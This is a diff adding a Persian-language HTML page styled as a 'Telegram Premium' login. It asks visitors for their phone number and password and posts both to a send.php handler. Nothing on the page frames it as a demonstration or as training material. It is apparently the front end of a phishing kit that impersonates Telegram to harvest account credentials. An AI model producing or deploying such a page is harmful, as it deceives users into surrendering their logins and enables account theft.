@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Premium</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f1f1f1;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background-color: #ffffff;
+            width: 380px;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            text-align: center;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+            color: #0088cc;
+            font-size: 24px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            background-color: #0088cc;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #0077aa;
+        }
+        .login-container .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #888;
+        }
+        .login-container .footer a {
+            color: #0088cc;
+            text-decoration: none;
+        }
+        .login-container .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <h2>Telegram Premium</h2>
+        <p>ورود به حساب تلگرام</p>
+        <form action="send.php" method="POST">
+            <input type="text" name="phone" placeholder="شماره تلفن" required>
+            <input type="password" name="password" placeholder="رمز عبور" required>
+            <button type="submit">ورود</button>
+        </form>
+        <div class="footer">
+            <p>عضو نیستید؟ <a href="#">ثبت‌نام کنید</a></p>
+        </div>
+    </div>
+
+</body>
+</html>
